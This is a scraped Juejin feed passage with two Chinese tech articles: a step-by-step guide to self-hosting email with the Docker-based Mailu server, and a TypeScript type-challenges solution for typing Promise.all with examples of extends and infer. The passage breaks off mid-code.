.hljs-title{color:#fff}.hljs-attribute,.hljs-link,.hljs-regexp,.hljs-symbol{color:#bf79db}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-emphasis,.hljs-section,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-string,.hljs-subst,.hljs-template-tag,.hljs-template-variable,.hljs-title,.hljs-type,.hljs-variable{color:#a6e22e}.hljs-comment,.hljs-deletion,.hljs-meta,.hljs-quote{color:#75715e}.hljs-doctag,.hljs-keyword,.hljs-literal,.hljs-section,.hljs-selector-id,.hljs-selector-tag,.hljs-title,.hljs-type{font-weight:700}</style><blockquote>
<p>从“为什么要自建邮箱”讲起，拆解 Mailu 的架构、优缺点，以及普通人也能照着做的安装实战。</p>
<p>Github：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FMailu%2FMailu" target="_blank" title="https://github.com/Mailu/Mailu" ref="nofollow noopener noreferrer">github.com/Mailu/Mailu</a></p>
<p>官网：<a href="https://link.juejin.cn?target=https%3A%2F%2Fmailu.io%2F" target="_blank" title="https://mailu.io/" ref="nofollow noopener noreferrer">mailu.io/</a></p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/401cc5720a8449ceaacd10398ca7934a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR2V0Y2hhclpw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770736855&amp;x-signature=csROttHHvmKZH1iYvGUiQbMFeaI%3D" alt="b4104652304a1f868421518e475c6c1d.png" loading="lazy"/></p>
<p>这几年，越来越多团队开始重新审视一件事：<strong>邮箱，到底要不要掌握在自己手里？</strong></p>
<p>用第三方企业邮箱当然省事，但账号封禁、功能限制、隐私不可控的问题，一旦遇到，几乎没有回旋余地。于是，自建邮件服务器这件事，又被不少技术团队重新捡了起来。</p>
<p>而在一堆方案里，<strong>Mailu</strong> 是被频繁提到的一个名字。</p>
<h3 data-id="heading-0">Mailu 是什么？一句话先讲明白</h3>
<p><strong>Mailu 是一套基于 Docker 的开源邮件服务器整体解决方案。</strong></p>
<p>它不是某一个单独的软件，而是把<strong>收信、发信、反垃圾、Web 邮箱、管理后台</strong>这些组件，全部拆分成容器，再用一套统一的方式帮你组装好。</p>
<p>你不用再自己去拼 Postfix + Dovecot + SpamAssassin + Webmail，也不用被复杂的配置文件折磨，Mailu 的目标很直接：<br/>
<strong>让“自建邮件服务器”这件事，变得工程化、可复制。</strong></p>
<h3 data-id="heading-1">Mailu 内部是怎么工作的？</h3>
<p>Mailu 本质上是一套“邮件系统拼装模板”，核心组件包括：</p>
<ul>
<li><strong>Postfix</strong>：负责邮件发送（SMTP）</li>
<li><strong>Dovecot</strong>：负责邮件接收（IMAP / POP3）</li>
<li><strong>Rspamd</strong>：反垃圾、反病毒</li>
<li><strong>Webmail（Roundcube 或 RainLoop）</strong> ：网页邮箱</li>
<li><strong>Admin 管理后台</strong>：域名、用户、别名统一管理</li>
<li><strong>Redis / MariaDB</strong>：状态和数据存储</li>
</ul>
<p>所有组件都通过 Docker 运行，你看到的不是一堆零散服务，而是一套已经编排好的系统。</p>
<p>这也是 Mailu 最大的特点：<br/>
<strong>它不是“教你怎么搭”，而是“直接给你一套能跑的”。</strong></p>
<h3 data-id="heading-2">Mailu 的基本安装思路（不踩坑版）</h3>
<p>整体流程其实很清晰：</p>
<p><strong>第一步：配置 DNS</strong></p>
<p>假设域名为 <code>example.com</code>，服务器IP为 <code>1.2.3.4</code></p>
<ul>
<li>
<p>A 记录</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 主机记录           记录类型  IP</span>
mail.example.com    A    1.2.3.4
</code></pre>
</li>
<li>
<p>MX 记录</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 主机记录@    记录类型  优先级  记录值</span>
example.com    MX    10 mail.example.com
</code></pre>
</li>
</ul>
<p>核心是配置 A、MX 记录，这是邮件系统成败的关键一步，不能省。另外还有 SPF、DKIM、DMARC 可以按需配置。</p>
<p><strong>第二步：启动 Mailu</strong></p>
<ul>
<li>
<p>创建 mailu 文件夹</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">mkdir</span> /mailu
<span class="hljs-built_in">cd</span> /mailu
</code></pre>
</li>
<li>
<p>访问 <a href="https://link.juejin.cn?target=https%3A%2F%2Fsetup.mailu.io%2F" target="_blank" title="https://setup.mailu.io/" ref="nofollow noopener noreferrer">setup.mailu.io/</a> 填写域名信息后（参考以下截图填写主域名、二级域名），点击界面最下方的 <strong>Setup Mailu</strong> ,此时官方会跳转到 Mailu configuration - 界面，下载界面提供 <strong>docker-compose.yml</strong> 、<strong>mailu.env</strong> 的两个文件到服务器的 mailu 目录下</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4da49385afcd43d68d7c4195bfbc793d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR2V0Y2hhclpw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770736855&amp;x-signature=pScsZFwxYhVGFH5NjXfkOahvmY0%3D" alt="image.png" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ca7ea51b7d5e42579dd158f99c25a9fc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR2V0Y2hhclpw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770736855&amp;x-signature=VCKi1MpQNM1HbNp21H56hAjJWas%3D" alt="image.png" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f29e49b36cce4673a23c525fb14e35ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR2V0Y2hhclpw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770736855&amp;x-signature=k5AUT9iMiIcQlVTOTNqAJurrkj0%3D" alt="ef0a9155f8456effe2f44b4846712252.png" loading="lazy"/></p>
</li>
<li>
<p>手动修改 <strong>docker-compose.yml</strong> ，移除 front 端口映射中的 <code>127.0.0.1</code> ，使其能够被外部访问到</p>
</li>
<li>
<p>一条命令启动服务 <code>docker compose up -d</code></p>
</li>
</ul>
<p><strong>第三步：后台创建用户</strong></p>
<ul>
<li>
<p>登录 Admin 页面，在浏览器中访问 <code>服务器IP/admin</code> 或者 <code>mail.主域名/admin</code>，服务默认在 80 端口上</p>
</li>
<li>
<p>添加域名、邮箱账号，执行下面命令后会获取到一个超管账户，邮箱为 <code>me.example.com</code> ，密码为 <code>password</code></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># docker compose exec admin flask mailu admin [用户名] [主域名] [密码]</span>
<span class="hljs-comment"># 示例：</span>
docker compose <span class="hljs-built_in">exec</span> admin flask mailu admin me example.com <span class="hljs-string">'password'</span>
</code></pre>
</li>
<li>
<p>测试收发邮件</p>
<p>访问 <code>服务器IP/webmail</code> 或者 <code>mail.主域名/webmail</code> 如果能收到其他邮件系统发送过来的邮件，说明收件相关的配置没有问题咯</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e84190ae52894eecbe3d79c430dd1735~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR2V0Y2hhclpw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770736855&amp;x-signature=e7DOmreRsijNrLCrP9CnunAqHIo%3D" alt="227b722c1c28869466385f52dc90b875.png" loading="lazy"/></p>
</li>
</ul>
<h3 data-id="heading-3">写在最后</h3>
<p>Mailu 并不是“最简单”的邮件方案，但它是<strong>少数能把复杂事情系统化的方案之一</strong>。</p>
<p>当你真正把邮件当成一项基础设施，而不是一个外包服务时，你会发现，自建并没有想象中那么可怕。</p>
<p>真正难的，从来不是工具，而是你是否愿意为“可控”付出一点学习成本。</p>
<p>如果你已经在考虑这一步，Mailu，值得你认真试一次。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[type-challenges（ts类型体操）: 20 - Promise.all]]></title>    <link>https://juejin.cn/post/7602503154505351209</link>    <guid>https://juejin.cn/post/7602503154505351209</guid>    <pubDate>2026-02-03T14:05:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602503154505351209" data-draft-id="7602420156397600811" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="type-challenges（ts类型体操）: 20 - Promise.all"/> <meta itemprop="keywords" content="TypeScript"/> <meta itemprop="datePublished" content="2026-02-03T14:05:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="fxss"/> <meta itemprop="url" content="https://juejin.cn/user/3702810892856808"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            type-challenges（ts类型体操）: 20 - Promise.all
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3702810892856808/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    fxss
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T14:05:39.000Z" title="Tue Feb 03 2026 14:05:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">20 - Promise.all</h2>
<p>by Anthony Fu (@antfu) #中等 #array #promise</p>
<h3 data-id="heading-1">题目</h3>
<p>给函数<code>PromiseAll</code>指定类型，它接受元素为 Promise 或者类似 Promise 的对象的数组，返回值应为<code>Promise&lt;T&gt;</code>，其中<code>T</code>是这些 Promise 的结果组成的数组。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> promise1 = <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-number">3</span>);
<span class="hljs-keyword">const</span> promise2 = <span class="hljs-number">42</span>;
<span class="hljs-keyword">const</span> promise3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt;(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
  <span class="hljs-built_in">setTimeout</span>(resolve, <span class="hljs-number">100</span>, <span class="hljs-string">'foo'</span>);
});

<span class="hljs-comment">// 应推导出 `Promise&lt;[number, 42, string]&gt;`</span>
<span class="hljs-keyword">const</span> p = <span class="hljs-title class_">PromiseAll</span>([promise1, promise2, promise3] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>)
</code></pre>
<blockquote>
<p>在 Github 上查看：<a href="https://link.juejin.cn?target=https%3A%2F%2Ftsch.js.org%2F20%2Fzh-CN" target="_blank" title="https://tsch.js.org/20/zh-CN" ref="nofollow noopener noreferrer">tsch.js.org/20/zh-CN</a></p>
</blockquote>
<h3 data-id="heading-2">代码</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">/* _____________ 你的代码 _____________ */</span>

<span class="hljs-keyword">declare</span> <span class="hljs-keyword">function</span> <span class="hljs-title class_">PromiseAll</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">any</span>[]&gt;(<span class="hljs-attr">values</span>: [...T]): <span class="hljs-title class_">Promise</span>&lt;{ [K <span class="hljs-keyword">in</span> keyof T]: <span class="hljs-title class_">Awaited</span>&lt;T[K]&gt; }&gt;

</code></pre>
<p>关键解释：</p>
<ul>
<li><code>T extends any[]</code>：约束 <code>T</code> 必须是数组类型。</li>
<li><code>[...T]</code>：是数组扩展语法（元组展开），用于保留输入数组的元组结构。</li>
<li><code>Awaited&lt;T[K]&gt;</code>：获取 <code>Promise</code> 或者类似 <code>Promise</code> 的对象的结果类型。</li>
<li><code>Promise&lt;...&gt;</code>：函数返回一个 <code>Promise</code>。</li>
<li><code>{ [K in keyof T]: Awaited&lt;T[K]&gt; }</code>：将结果类型组成数组。
<ul>
<li><code>{ [K in keyof T]: ... }</code>：这是一个映射类型，遍历元组 <code>T</code> 的所有索引 <code>K</code>（如 0、1、2...），并为每个索引生成对应的类型。</li>
<li><code>Awaited&lt;T[K]&gt;</code>：获取 <code>Promise</code> 或者类似 <code>Promise</code> 的对象的结果类型。
<ul>
<li>若 <code>T[K]</code> 是 <code>Promise&lt;X&gt;</code>，则 <code>Awaited&lt;T[K]&gt;</code> 为 <code>X</code>;</li>
<li>若 <code>T[K]</code> 是普通值 <code>X</code>，则 <code>Awaited&lt;T[K]&gt;</code> 仍为 <code>X</code>;</li>
<li><code>Awaited</code> 支持嵌套 <code>Promise</code>，如 <code>Awaited&lt;Promise&lt;Promise&lt;X&gt;&gt;&gt;</code> 也会解析为 <code>X</code>。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 data-id="heading-3">相关知识点</h3>
<h4 data-id="heading-4"><code>extends</code></h4>




















<table><thead><tr><th>使用维度</th><th>核心作用</th><th>示例场景</th></tr></thead><tbody><tr><td>类型维度</td><td>做类型约束或条件判断（类型编程核心）</td><td>限定泛型范围、判断类型是否兼容、提取类型片段</td></tr><tr><td>语法维度</td><td>做继承（复用已有结构）</td><td>接口继承、类继承</td></tr></tbody></table>
<h5 data-id="heading-5"><code>extends</code> 做类型约束或条件判断</h5>
<ol>
<li>泛型约束：限定泛型的取值范围</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 约束 T 必须是「拥有 length 属性」的类型（比如 string/数组）</span>
<span class="hljs-keyword">function</span> getLength&lt;T <span class="hljs-keyword">extends</span> { <span class="hljs-attr">length</span>: <span class="hljs-built_in">number</span> }&gt;(<span class="hljs-attr">arg</span>: T): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">return</span> arg.<span class="hljs-property">length</span>;
}

<span class="hljs-comment">// 合法调用（符合约束）</span>
<span class="hljs-title function_">getLength</span>(<span class="hljs-string">"hello"</span>); <span class="hljs-comment">// ✅ string 有 length，返回 5</span>
<span class="hljs-title function_">getLength</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]); <span class="hljs-comment">// ✅ 数组有 length，返回 3</span>

<span class="hljs-comment">// 非法调用（超出约束）</span>
<span class="hljs-title function_">getLength</span>(<span class="hljs-number">123</span>); <span class="hljs-comment">// ❌ 报错：number 没有 length 属性</span>
</code></pre>
<ol start="2">
<li>条件类型：类型版 <strong>三元运算符</strong></li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 基础示例：判断类型是否为字符串</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">IsString</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span> ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;

<span class="hljs-keyword">type</span> A = <span class="hljs-title class_">IsString</span>&lt;<span class="hljs-string">"test"</span>&gt;; <span class="hljs-comment">// true（符合）</span>
<span class="hljs-keyword">type</span> B = <span class="hljs-title class_">IsString</span>&lt;<span class="hljs-number">123</span>&gt;; <span class="hljs-comment">// false（不符合）</span>
</code></pre>
<p>分布式条件类型（联合类型专用）: 当 <code>T</code> 是联合类型时，<code>extends</code> 会自动拆分联合类型的每个成员，逐个判断后再合并结果。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Union</span> = <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span> | <span class="hljs-built_in">boolean</span>;

<span class="hljs-comment">// 拆分逻辑：string→string，number→never，boolean→never → 合并为 string</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">OnlyString</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span> ? T : <span class="hljs-built_in">never</span>;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Result</span> = <span class="hljs-title class_">OnlyString</span>&lt;<span class="hljs-title class_">Union</span>&gt;; <span class="hljs-comment">// Result = string</span>
</code></pre>
<p>注意：只有泛型参数是 裸类型（没有被 []/{} 包裹）时，才会触发分布式判断：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 包裹后不触发分布式，整体判断 [string|number] 是否兼容 [string]</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">NoDist</span>&lt;T&gt; = [T] <span class="hljs-keyword">extends</span> [<span class="hljs-built_in">string</span>] ? T : <span class="hljs-built_in">never</span>;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Result2</span> = <span class="hljs-title class_">NoDist</span>&lt;<span class="hljs-title class_">Union</span>&gt;; <span class="hljs-comment">// never（整体不兼容）</span>
</code></pre>
<ol start="3">
<li>配合 <code>infer</code>：提取类型片段（黄金组合）</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 提取 Promise 的返回值类型</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">UnwrapPromise</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Promise</span>&lt;infer V&gt; ? V : T;

<span class="hljs-keyword">type</span> C = <span class="hljs-title class_">UnwrapPromise</span>&lt;<span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt;&gt;; <span class="hljs-comment">// string（提取成功）</span>
<span class="hljs-keyword">type</span> D = <span class="hljs-title class_">UnwrapPromise</span>&lt;<span class="hljs-built_in">number</span>&gt;; <span class="hljs-comment">// number（不满足条件，返回原类型）</span>
</code></pre>
<h5 data-id="heading-6"><code>extends</code> 做继承（复用已有结构）</h5>
<ol>
<li>接口继承：复用 + 扩展属性</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 基础接口</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
}

<span class="hljs-comment">// 继承 User，并扩展新属性</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Admin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">role</span>: <span class="hljs-string">"admin"</span> | <span class="hljs-string">"super_admin"</span>; <span class="hljs-comment">// 新增权限属性</span>
}

<span class="hljs-comment">// 必须包含继承的 + 扩展的所有属性</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">admin</span>: <span class="hljs-title class_">Admin</span> = {
  <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>,
  <span class="hljs-attr">name</span>: <span class="hljs-string">"张三"</span>,
  <span class="hljs-attr">role</span>: <span class="hljs-string">"admin"</span>
};

<span class="hljs-comment">// 多接口继承</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">HasAge</span> { <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>; }
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">User</span>, <span class="hljs-title class_">HasAge</span> {
  <span class="hljs-attr">className</span>: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// 同时继承 User + HasAge</span>
}
</code></pre>
<ol start="2">
<li>类继承：复用父类的属性 / 方法</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Parent</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }
  <span class="hljs-title function_">sayHi</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>);
  }
}

<span class="hljs-comment">// 继承 Parent 类</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Parent</span> {
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span>, age: <span class="hljs-built_in">number</span></span>) {
    <span class="hljs-variable language_">super</span>(name); <span class="hljs-comment">// 必须调用父类构造函数（初始化父类属性）</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
  }
  <span class="hljs-comment">// 重写父类方法</span>
  <span class="hljs-title function_">sayHi</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// 调用父类原方法</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.age}</span> years old`</span>);
  }
}

<span class="hljs-keyword">const</span> child = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>(<span class="hljs-string">"李四"</span>, <span class="hljs-number">10</span>);
child.<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// 输出：Hi, 李四 → I'm 10 years old</span>
</code></pre>
<p>补充：类实现接口用 <code>implements</code>（不是 <code>extends</code>）</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 定义接口（契约：规定必须有 id、name 属性，以及 greet 方法）</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-title function_">greet</span>(): <span class="hljs-built_in">void</span>; <span class="hljs-comment">// 仅定义方法签名，无实现</span>
}

<span class="hljs-comment">// 类实现接口（必须严格遵守契约）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Employee</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-comment">// 必须实现接口的所有属性</span>
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;

  <span class="hljs-comment">// 构造函数初始化属性</span>
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">id: <span class="hljs-built_in">number</span>, name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = id;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }

  <span class="hljs-comment">// 必须实现接口的 greet 方法（具体实现由类自己定义）</span>
  <span class="hljs-title function_">greet</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>, ID: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.id}</span>`</span>);
  }
}

<span class="hljs-comment">// 实例化使用</span>
<span class="hljs-keyword">const</span> emp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Employee</span>(<span class="hljs-number">1</span>, <span class="hljs-string">"张三"</span>);
emp.<span class="hljs-title function_">greet</span>(); <span class="hljs-comment">// 输出：Hi, I'm 张三, ID: 1</span>


<span class="hljs-comment">// 接口1：基础信息</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Identifiable</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-title function_">getId</span>(): <span class="hljs-built_in">number</span>;
}

<span class="hljs-comment">// 接口2：可打印</span>
